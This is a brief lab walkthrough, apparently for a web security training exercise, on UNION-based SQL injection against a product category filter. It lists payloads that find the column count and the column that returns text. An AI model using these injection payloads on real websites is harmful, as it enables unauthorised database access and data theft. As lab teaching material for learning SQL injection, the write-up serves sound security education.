
1. By injecting this query, we know that the number of columns is 3
```
filter?category=Gift' UNION SELECT NULL,NULL,NULL--
```

2. Try injecting each of these queires to find the column containing text. Since only the second query gives us no error, we know that the second column contains text.
```
filter?category=Gift' UNION SELECT 'a',NULL,NULL--
filter?category=Gift' UNION SELECT NULL,'a',NULL--
filter?category=Gift' UNION SELECT NULL,NULL,'a'--
```

